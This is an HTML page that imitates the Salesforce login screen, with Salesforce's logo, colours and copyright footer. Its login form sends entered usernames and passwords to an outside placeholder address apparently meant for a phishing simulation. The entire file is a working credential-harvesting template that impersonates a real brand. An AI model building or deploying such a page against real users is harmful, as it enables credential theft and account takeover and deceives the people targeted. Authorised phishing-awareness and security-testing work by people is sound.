<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login | Salesforce</title>
  <style>
    body {
      margin: 0;
      background: linear-gradient(180deg, #0176D3 0%, #FFFFFF 40%);
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 400px;
      background-color: white;
      margin: 80px auto;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.2);
    }
    .logo {
      display: block;
      margin: 0 auto 20px auto;
    }
    h2 {
      text-align: center;
      color: #032D60;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin: 10px 0 5px;
      color: #032D60;
      font-weight: bold;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #c9c9c9;
      border-radius: 4px;
      box-sizing: border-box;
    }
    .login-button {
      width: 100%;
      background-color: #0176D3;
      color: white;
      border: none;
      padding: 12px;
      margin-top: 20px;
      border-radius: 4px;
      cursor: pointer;
      font-weight: bold;
      font-size: 15px;
    }
    .login-button:hover {
      background-color: #0159a6;
    }
    .links {
      text-align: center;
      margin-top: 15px;
    }
    .links a {
      color: #0176D3;
      text-decoration: none;
      font-size: 14px;
    }
    .footer {
      text-align: center;
      margin-top: 40px;
      color: #666;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://login.salesforce.com/img/logo214.svg" alt="Salesforce Logo" class="logo" width="150">
    <h2>Log In to Salesforce</h2>
    <form action="https://your-simulation-link.com/submit" method="POST">
      <label for="username">Username</label>
      <input type="text" id="username" name="username" placeholder="Email or Username" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Password" required>

      <button type="submit" class="login-button">Log In</button>
    </form>
    <div class="links">
      <a href="#">Forgot Your Password?</a><br><br>
      <a href="#">Use Custom Domain</a>
    </div>
  </div>

  <div class="footer">
    Â© 2025 salesforce.com, inc. All rights reserved.<br>
    <a href="#">Privacy</a> | <a href="#">Terms of Service</a>
  </div>
</body>
</html>
